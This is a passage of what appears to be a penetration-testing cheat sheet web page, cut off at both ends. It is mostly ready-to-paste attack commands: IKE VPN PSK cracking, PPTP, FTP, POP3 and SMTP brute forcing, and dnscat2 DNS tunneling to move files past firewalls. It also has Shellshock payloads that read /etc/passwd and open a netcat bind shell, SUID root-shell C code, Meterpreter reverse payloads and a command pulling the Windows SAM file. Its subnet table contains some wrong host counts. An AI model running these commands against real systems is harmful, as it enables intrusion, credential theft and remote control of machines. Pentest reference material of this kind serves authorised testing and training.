`<code>`{=html}255.255.255.192`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}62 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/25
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.128`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}126 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/24
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}254 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/23
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.254.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}512 Host`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/22
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.252.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}1022 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/21
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.248.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}2046 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/20
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.240.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}4094 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/19
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.224.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}8190 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/18
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.192.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}16382 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/17
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.128.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}32766 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/16
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}65534 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/15
</p>
</td>
<td>
<p>
`<code>`{=html}255.254.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}131070 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/14
</p>
</td>
<td>
<p>
`<code>`{=html}255.252.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}262142 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/13
</p>
</td>
<td>
<p>
`<code>`{=html}255.248.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}524286 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/12
</p>
</td>
<td>
<p>
`<code>`{=html}255.240.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}1048674 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/11
</p>
</td>
<td>
<p>
`<code>`{=html}255.224.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}2097150 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/10
</p>
</td>
<td>
<p>
`<code>`{=html}255.192.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}4194302 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/9
</p>
</td>
<td>
<p>
`<code>`{=html}255.128.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}8388606 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/8
</p>
</td>
<td>
<p>
`<code>`{=html}255.0.0.0`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}16777214 Hosts`</code>`{=html}
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="vlan-hopping">
VLAN Hopping
</h3>
<p>
Using NCCGroups VLAN wrapper script for Yersina simplifies the process.
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>git clone https://github.com/nccgroup/vlan-hopping.git
chmod 700 frogger.sh
./frogger.sh 
</code></pre>
:::
::::

<h3 id="vpn-pentesting-tools">
VPN Pentesting Tools
</h3>
<p>
Identify VPN servers:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./udp-protocol-scanner.pl -p ike TARGET(s)

</code></pre>
:::
::::

<p>
Scan a range for VPN servers:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./udp-protocol-scanner.pl -p ike -f ip.txt
</code></pre>
:::
::::

<h4 id="ikeforce">
IKEForce
</h4>
<p>
Use IKEForce to enumerate or dictionary attack VPN servers.
</p>
<p>
Install:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git
</code></pre>
:::
::::

<p>
Perform IKE VPN enumeration with IKEForce:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
</code></pre>
:::
::::

<p>
Bruteforce IKE VPN using IKEForce:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
</code></pre>
:::
::::

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
</code></pre>
:::
::::

<h4 id="ike-aggressive-mode-psk-cracking">
IKE Aggressive Mode PSK Cracking
</h4>
<ol>
<li>
Identify VPN Servers
</li>
<li>
Enumerate with IKEForce to obtain the group ID
</li>
<li>
Use ike-scan to capture the PSK hash from the IKE endpoint
</li>
<li>
Use psk-crack to crack the hash
</li>
</ol>
<h5 id="step-1-idenitfy-ike-servers">
Step 1: Idenitfy IKE Servers
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./udp-protocol-scanner.pl -p ike SUBNET/24
</code></pre>
:::
::::

<h5 id="step-2-enumerate-group-name-with-ikeforce">
Step 2: Enumerate group name with IKEForce
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
</code></pre>
:::
::::

<h5 id="step-3-use-ike-scan-to-capture-the-psk-hash">
Step 3: Use ike-scan to capture the PSK hash
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
</code></pre>
:::
::::

<h5 id="step-4-use-psk-crack-to-crack-the-psk-hash">
Step 4: Use psk-crack to crack the PSK hash
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>psk-crack hash-file.txt
</code></pre>
:::
::::

<p>
Some more advanced psk-crack options below:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key
</code></pre>
:::
::::

<h4 id="pptp-hacking">
PPTP Hacking
</h4>
<p>
Identifying PPTP, it listens on TCP: 1723
</p>
<h5 id="nmap-pptp-fingerprint">
NMAP PPTP Fingerprint:
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap –Pn -sV -p 1723 TARGET(S)
</code></pre>
:::
::::

<h5 id="pptp-dictionary-attack">
PPTP Dictionary Attack
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
</code></pre>
:::
::::

<h3 id="dns-tunneling">
DNS Tunneling
</h3>
<p>
Tunneling data over DNS to bypass firewalls.
</p>
<p>
dnscat2 supports "download" and "upload" commands for getting files
(data and programs) to and from the target machine.
</p>
<h4 id="attacking-machine">
Attacking Machine
</h4>
<p>
Installtion:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get update
apt-get -y install ruby-dev git make g++
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
</code></pre>
:::
::::

<p>
Run dnscat2:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ruby ./dnscat2.rb
dnscat2&gt; New session established: 1422
dnscat2&gt; session -i 1422
</code></pre>
:::
::::

<p>
Target Machine:
</p>
<p>
https://downloads.skullsecurity.org/dnscat2/
https://github.com/lukebaggett/dnscat2-powershell/
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>dnscat --host &lt;dnscat server_ip&gt;
</code></pre>
:::
::::

<h2 id="bof--exploit">
BOF / Exploit
</h2>
<h2 id="exploit-research">
Exploit Research
</h2>
<p>
Find exploits for enumerated hosts / services.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>searchsploit windows 2003 | grep -i local</code></p>
      </td>
      <td>
            <p>Search exploit-db for exploit, in this example windows 2003 + local esc</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>site:exploit-db.com exploit kernel &lt;= 3</code></p>
      </td>
      <td>
            <p>Use google to search exploit-db.com for exploits</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>grep -R "W7" /usr/share/metasploit-framework<br />/modules/exploit/windows/*</code></p>
      </td>
      <td>
            <p>Search metasploit modules using grep - msf search sucks a bit</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h3 id="searching-for-exploits">
Searching for Exploits
</h3>
<p>
Install local copy of exploit-db:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code> searchsploit –u
 searchsploit apache 2.2
 searchsploit "Linux Kernel"
 searchsploit linux 2.6 | grep -i ubuntu | grep local
</code></pre>
:::
::::

<h3 id="compiling-windows-exploits-on-kali">
Compiling Windows Exploits on Kali
</h3>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
  wine mingw-get-setup.exe
  select mingw32-base
  cd /root/.wine/drive_c/windows
  wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip
  cd /root/.wine/drive_c/MinGW/bin
  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
  wine ability.exe  
</code></pre>
:::
::::

<h3 id="cross-compiling-exploits">
Cross Compiling Exploits
</h3>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
</code></pre>
:::
::::

<h3 id="exploiting-common-vulnerabilities">
Exploiting Common Vulnerabilities
</h3>
<h4 id="exploiting-shellshock">
Exploiting Shellshock
</h4>
<p>
A tool to find and exploit servers vulnerable to Shellshock:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>git clone https://github.com/nccgroup/shocker
</code></pre>
:::
::::

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
</code></pre>
:::
::::

<h5 id="cat-file-view-file-contents">
cat file (view file contents)
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
</code></pre>
:::
::::

<h5 id="shell-shock-run-bind-shell">
Shell Shock run bind shell
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
</code></pre>
:::
::::

<h5 id="shell-shock-reverse-shell">
Shell Shock reverse Shell
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nc -l -p 443
</code></pre>
:::
::::

<h2 id="simple-local-web-servers">
Simple Local Web Servers
</h2>
<p>
Python local web server command, handy for serving up shells and
exploits on an attacking machine.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>python -m SimpleHTTPServer 80</code></p>
      </td>
      <td>
            <p>Run a basic http server, great for serving up shells etc</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>python3 -m http.server</code></p>
      </td>
      <td>
            <p>Run a basic Python3 http server, great for serving up shells etc</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>ruby -rwebrick -e "WEBrick::HTTPServer.new<br />(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start"</code></p>
      </td>
      <td>
            <p>Run a ruby webrick basic http server</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>php -S 0.0.0.0:80</code></p>
      </td>
      <td>
            <p>Run a basic PHP http server</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h2 id="mounting-file-shares">
Mounting File Shares
</h2>
<p>
How to mount NFS / CIFS, Windows and Linux file shares.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}mount 192.168.1.1:/vol/share /mnt/nfs`</code>`{=html}
</p>
</td>
<td>
<p>
Mount NFS share to `<code>`{=html}/mnt/nfs`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}mount -t cifs -o
username=user,password=pass`<br />`{=html},domain=blah
//192.168.1.X/share-name /mnt/cifs`</code>`{=html}
</p>
</td>
<td>
<p>
Mount Windows CIFS / SMB share on Linux at
`<code>`{=html}/mnt/cifs`</code>`{=html} if you remove password it will
prompt on the CLI (more secure as it wont end up in bash_history)
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}net use Z: \\win-server`\share `{=tex}password
`<br />`{=html} /user:domain`\janedoe `{=tex}/savecred
/p:no`</code>`{=html}
</p>
</td>
<td>
<p>
Mount a Windows share on Windows from the command line
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}apt-get install smb4k -y`</code>`{=html}
</p>
</td>
<td>
<p>
Install smb4k on Kali, useful Linux GUI for browsing SMB shares
</p>
</td>
</tr>
</tbody>
</table>
:::

<h2 id="http--https-webserver-enumeration">
HTTP / HTTPS Webserver Enumeration
</h2>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>nikto -h 192.168.1.1</code></p>
      </td>
      <td>
            <p>Perform a nikto scan against target</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>dirbuster</code></p>
      </td>
      <td>
            <p>Configure via GUI, CLI input doesn't work most of the time</p>
      </td>

</tr>
</tbody>
</table>
:::

<h2 id="packet-inspection">
Packet Inspection
</h2>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}tcpdump tcp port 80 -w output.pcap -i
eth0`</code>`{=html}
</p>
</td>
<td>
<p>
tcpdump for port 80 on interface eth0, outputs to output.pcap
</p>
</td>
</tr>
</tbody>
</table>
:::

<h2 id="username-enumeration">
Username Enumeration
</h2>
<p>
Some techniques used to remotely enumerate users on a target system.
</p>
<h3 id="smb-user-enumeration">
SMB User Enumeration
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tr>
<td>
<p>
`<code>`{=html}python
/usr/share/doc/python-impacket-doc/examples`<br />`{=html}/samrdump.py
192.168.XXX.XXX`</code>`{=html}
</p>
</td>
<td>
<p>
Enumerate users from SMB
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}ridenum.py 192.168.XXX.XXX 500 50000
dict.txt`</code>`{=html}
</p>
</td>
<td>
<p>
RID cycle SMB / enumerate users from SMB
</p>
</td>
</tr>
</table>
:::

<h3 id="snmp-user-enumeration">
SNMP User Enumeration
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tr>
<td>
<p>
`<code>`{=html}snmpwalk public -v1 192.168.X.XXX 1 \|grep 77.1.2.25
`<br />`{=html}\|cut -d" " -f4`</code>`{=html}
</p>
</td>
<td>
<p>
Enmerate users from SNMP
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}python
/usr/share/doc/python-impacket-doc/examples/`<br />`{=html}samrdump.py
SNMP 192.168.X.XXX`</code>`{=html}
</p>
</td>
<td>
<p>
Enmerate users from SNMP
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt
`<br />`{=html}(then grep)`</code>`{=html}
</p>
</td>
<td>
<p>
Search for SNMP servers with nmap, grepable output
</p>
</td>
</tr>
</table>
:::

<h2 id="passwords">
Passwords
</h2>
<h3 id="wordlists">
Wordlists
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
    <p><code>/usr/share/wordlists</code></p>
      </td>
      <td>
            <p>Kali word lists</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h2 id="brute-forcing-services">
Brute Forcing Services
</h2>
<h3 id="hydra-ftp-brute-force">
Hydra FTP Brute Force
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
`<br />`{=html}192.168.X.XXX ftp -V`</code>`{=html}
</p>
</td>
<td>
<p>
Hydra FTP brute force
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="hydra-pop3-brute-force">
Hydra POP3 Brute Force
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
`<br />`{=html}192.168.X.XXX pop3 -V`</code>`{=html}
</p>
</td>
<td>
<p>
Hydra POP3 brute force
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="hydra-smtp-brute-force">
Hydra SMTP Brute Force
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp
-V`</code>`{=html}
</p>
</td>
<td>
<p>
Hydra SMTP brute force
</p>
</td>
</tr>
</tbody>
</table>
:::

<p>
Use `<code>`{=html}-t`</code>`{=html} to limit concurrent connections,
example: `<code>`{=html}-t 15`</code>`{=html}
</p>
<h2 id="password-cracking">
Password Cracking
</h2>
<p>
Password cracking penetration testing tools.
</p>
<h3 id="john-the-ripper---jtr">
John The Ripper - JTR
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}john --wordlist=/usr/share/wordlists/rockyou.txt
hashes`</code>`{=html}
</p>
</td>
<td>
<p>
JTR password cracking
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}john --format=descrypt --wordlist
/usr/share/wordlists/rockyou.txt hash.txt`</code>`{=html}
</p>
</td>
<td>
<p>
JTR forced descrypt cracking with wordlist
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}john --format=descrypt hash --show`</code>`{=html}
</p>
</td>
<td>
<p>
JTR forced descrypt brute force cracking
</p>
</td>
</tr>
</tbody>
</table>
:::

<h2 id="windows-penetration-testing-commands">
Windows Penetration Testing Commands
</h2>
<p>
See `<strong>`{=html}Windows Penetration Testing
Commands`</strong>`{=html}.
</p>
<h2 id="linux-penetration-testing-commands">
Linux Penetration Testing Commands
</h2>
<p>
See Linux Commands Cheat Sheet (right hand menu) for a list of Linux
Penetration testing commands, useful for local system enumeration.
</p>
<h2 id="compiling-exploits">
Compiling Exploits
</h2>
<p>
Some notes on compiling exploits.
</p>
<h3 id="identifying-if-c-code-is-for-windows-or-linux">
Identifying if C code is for Windows or Linux
</h3>
<p>
C #includes will indicate which OS should be used to build the exploit.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></p>
      </td>
      <td>
            <p>Windows exploit code</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, <br /> sys/sockt.h, sys/types.h, unistd.h</code></p>
      </td>
      <td>
            <p>Linux exploit code</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h3 id="build-exploit-gcc">
Build Exploit GCC
</h3>
<p>
Compile exploit gcc.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>gcc -o exploit exploit.c</code></p>
      </td>
      <td>
            <p>Basic GCC compile</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h3 id="gcc-compile-32bit-exploit-on-64bit-kali">
GCC Compile 32Bit Exploit on 64Bit Kali
</h3>
<p>
Handy for cross compiling 32 bit binaries on 64 bit attacking machines.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tr>
<td>
<p>
`<code>`{=html}gcc -m32 exploit.c -o exploit`</code>`{=html}
</p>
</td>
<td>
<p>
Cross compile 32 bit binary on 64 bit Linux
</p>
</td>
</tr>
</table>
:::

<h3 id="compile-windows-exe-on-linux">
Compile Windows .exe on Linux
</h3>
<p>
Build / compile windows exploits on Linux, resulting in a .exe file.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tr>
<td>
<p>
`<code>`{=html}i586-mingw32msvc-gcc exploit.c -lws2_32 -o
exploit.exe`</code>`{=html}
</p>
</td>
<td>
<p>
Compile windows .exe on Linux
</p>
</td>
</tr>
</table>
:::

<h2 id="suid-binary">
SUID Binary
</h2>
<p>
Often SUID C binary files are required to spawn a shell as a superuser,
you can update the UID / GID and shell as required.
</p>
<p>
below are some quick copy and pate examples for various shells:
</p>
<h3 id="suid-c-shell-for-binbash">
SUID C Shell for /bin/bash
</h3>
<figure class="highlight">
<pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
       <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
       <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>       </code></pre>
</figure>
<h3 id="suid-c-shell-for-binsh">
SUID C Shell for /bin/sh
</h3>
<figure class="highlight">
<pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
       <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
       <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>       </code></pre>
</figure>
<h3 id="building-the-suid-shell-binary">
Building the SUID Shell binary
</h3>
<figure class="highlight">
<pre><code class="language-bash" data-lang="bash">gcc <span class="nt">-o</span> suid suid.c  </code></pre>
</figure>
<p>
For 32 bit:
</p>
<figure class="highlight">
<pre><code class="language-bash" data-lang="bash">gcc <span class="nt">-m32</span> <span class="nt">-o</span> suid suid.c  </code></pre>
</figure>
<h2 id="reverse-shells">
Reverse Shells
</h2>
<p>
See `<a href="/blog/reverse-shell-cheat-sheet/">`{=html}Reverse Shell
Cheat Sheet`</a>`{=html} for a list of useful Reverse Shells.
</p>
<h2 id="tty-shells">
TTY Shells
</h2>
<p>
Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful
for running commands like `<code>`{=html}su`</code>`{=html} from reverse
shells.
</p>
<h3 id="python-tty-shell-trick">
Python TTY Shell Trick
</h3>
<figure class="highlight">
<pre><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty;pty.spawn("/bin/bash")'</span></code></pre>
</figure>
<figure class="highlight">
<pre><code class="language-bash" data-lang="bash"><span class="nb">echo </span>os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span></code></pre>
</figure>
<h3 id="spawn-interactive-sh-shell">
Spawn Interactive sh shell
</h3>
<figure class="highlight">
<pre><code class="language-bash" data-lang="bash">/bin/sh <span class="nt">-i</span></code></pre>
</figure>
<h3 id="spawn-perl-tty-shell">
Spawn Perl TTY Shell
</h3>
<figure class="highlight">
<pre><code class="language-perl" data-lang="perl"><span class="nb">exec</span> <span class="p">"</span><span class="s2">/bin/sh</span><span class="p">";</span>
<span class="nv">perl</span> <span class="err">—</span><span class="nv">e</span> <span class="p">'</span><span class="s1">exec "/bin/sh";</span><span class="p">'</span></code></pre>
</figure>
<h3 id="spawn-ruby-tty-shell">
Spawn Ruby TTY Shell
</h3>
<figure class="highlight">
<pre><code class="language-ruby" data-lang="ruby"><span class="nb">exec</span> <span class="s2">"/bin/sh"</span></code></pre>
</figure>
<h3 id="spawn-lua-tty-shell">
Spawn Lua TTY Shell
</h3>
<figure class="highlight">
<pre><code class="language-lua" data-lang="lua"><span class="nb">os.execute</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span></code></pre>
</figure>
<h3 id="spawn-tty-shell-from-vi">
Spawn TTY Shell from Vi
</h3>
<p>
Run shell commands from vi:
</p>
<figure class="highlight">
<pre><code class="language-bash" data-lang="bash">:!bash</code></pre>
</figure>
<h3 id="spawn-tty-shell-nmap">
Spawn TTY Shell NMAP
</h3>
<figure class="highlight">
<pre><code class="language-bash" data-lang="bash"><span class="o">!</span>sh</code></pre>
</figure>
<h2 id="metasploit-cheat-sheet">
Metasploit Cheat Sheet
</h2>
<p>
A basic metasploit cheat sheet that I have found handy for reference.
</p>
<p>
Basic Metasploit commands, useful for reference, for pivoting see -
`<a href="/blog/ssh-meterpreter-pivoting-techniques/">`{=html}Meterpreter
Pivoting`</a>`{=html} techniques.
</p>
<h3 id="meterpreter-payloads">
Meterpreter Payloads
</h3>
<h3 id="windows-reverse-meterpreter-payload">
Windows reverse meterpreter payload
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>set payload windows/meterpreter/reverse_tcp</code></p>
      </td>
      <td>
            <p>Windows reverse tcp payload</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h3 id="windows-vnc-meterpreter-payload">
Windows VNC Meterpreter payload
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>set payload windows/vncinject/reverse_tcp</code></p>
        <p><code>set ViewOnly false</code></p>
      </td>
      <td>
            <p>Meterpreter Windows VNC Payload</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h3 id="linux-reverse-meterpreter-payload">
Linux Reverse Meterpreter payload
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>set payload linux/meterpreter/reverse_tcp</code></p>
      </td>
      <td>
            <p>Meterpreter Linux Reverse Payload</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h2 id="meterpreter-cheat-sheet">
Meterpreter Cheat Sheet
</h2>
<p>
Useful meterpreter commands.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>upload file c:\\windows</code></p>
      </td>
      <td>
            <p>Meterpreter upload file to Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>download c:\\windows\\repair\\sam /tmp</code></p>
      </td>
      <td>
